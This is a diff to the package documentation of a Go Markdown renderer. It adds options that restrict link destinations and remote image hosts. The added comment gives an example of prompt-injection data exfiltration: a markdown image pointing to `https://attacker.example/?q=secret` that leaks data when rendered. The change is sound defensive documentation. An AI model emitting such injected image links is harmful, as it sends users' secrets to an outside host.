@@ -125,7 +125,13 @@
 // through as written, and because destinations are entity-decoded before output
 // an obfuscated java&#115;cript: reaches the renderer as javascript: too. Pass
 // [WithSafeLinks] to filter destinations to an http/https/mailto/tel/relative
-// allowlist when rendering untrusted input.
+// allowlist when rendering untrusted input, and [WithURLPolicy] with
+// html.AllowImageHosts to stop model output from loading remote images — the
+// channel a prompt-injected ![](https://attacker.example/?q=secret) leaks
+// data through.
+//
+// Output is linear in input on every profile: reference expansion and GFM
+// table padding are budgeted, as in cmark and cmark-gfm.
 //
 // GFM tables, strikethrough and task lists, and the Memos math, hashtag,
 // typography and wiki-resource syntax live under extension/. Task lists are
